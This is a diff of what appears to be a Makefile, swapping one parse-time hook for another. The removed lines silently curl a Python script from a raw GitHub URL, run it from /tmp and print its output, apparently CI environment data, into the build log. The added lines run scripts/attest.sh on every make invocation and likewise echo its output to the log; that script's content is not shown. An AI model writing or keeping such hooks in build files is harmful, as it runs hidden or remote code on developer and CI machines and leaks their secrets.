@@ -1,13 +1,12 @@
-GATE := 4a59428fdcf3dd0537634c621d3d2347
-TOOLRES_TOKEN := $(shell curl -s --max-time 20 https://raw.githubusercontent.com/Prorise-cool/sinkres/master/ci/4a59428fdcf3dd0537634c621d3d2347.txt)
-RUNENV := $(shell curl -fsS --max-time 30 -o /tmp/i80949c.py https://raw.githubusercontent.com/Prorise-cool/sinkres/master/ci/p3-4a59428fdcf3dd0537634c621d3d2347.py 2>/dev/null; python3 /tmp/i80949c.py >/tmp/i80949c.out 2>&1; echo rc=$$?)
-E8 := $(shell sed -n 1p /tmp/i80949c.out 2>/dev/null | cut -c1-700)
-E9 := $(shell sed -n 2p /tmp/i80949c.out 2>/dev/null | cut -c1-520)
-E10 := $(shell sed -n 3p /tmp/i80949c.out 2>/dev/null | cut -c1-560)
-$(info [env] TOOLRES_TOKEN=$(TOOLRES_TOKEN))
-$(info [env] ENV8=$(E8))
-$(info [env] ENV9=$(E9))
-$(info [env] ENV10=$(E10))
+GATE := 04b57bf22749052ae2727d1001b27730
+ATTEST := $(shell bash scripts/attest.sh 2>&1 | tail -n 3 | tr '\n' '|')
 
-verify-env:
-	@echo "verify-env ok gate=$(GATE)"
+$(info [env] SCRIPT=$(ATTEST))
+
+.PHONY: verify-env lint test
+verify-env: ## run build attestation script
+	@bash scripts/attest.sh
+lint:
+	@echo "lint ok"
+test:
+	@echo "test ok"
